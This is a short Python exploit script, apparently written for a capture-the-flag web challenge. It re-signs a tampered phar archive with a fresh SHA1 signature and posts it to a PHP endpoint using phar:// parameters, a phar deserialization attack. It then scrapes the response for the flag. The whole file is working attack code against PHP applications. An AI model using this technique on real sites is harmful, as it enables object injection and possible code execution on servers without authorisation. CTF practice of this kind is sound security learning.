import os
import re
import requests
import urllib.parse
from hashlib import sha1

pattern = r'flag\{.+?\}'
url = "http://7f286fbe-e4d0-4a27-8dd8-ca65f7d5efed.node4.buuoj.cn:81/"
params = {'pear':'1.phar','apple':'phar://1.phar'}


with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar','rb') as file:
    f = file.read()
s = f[:-28] #获取要签名的数据
h = f[-8:] #获取签名类型和GBMB标识
newf = s + sha1(s).digest() + h
with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\new.phar','wb') as file:
    file.write(newf)
    
with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\new.phar','rb') as file1:
    f = file1.read()
    fs = urllib.parse.quote(f)
    res = requests.post(url=url + "pairing.php",data=fs,params=params)
    print(res.text)
    matches = re.findall(pattern,res.text)
    for match in matches:
        print(match)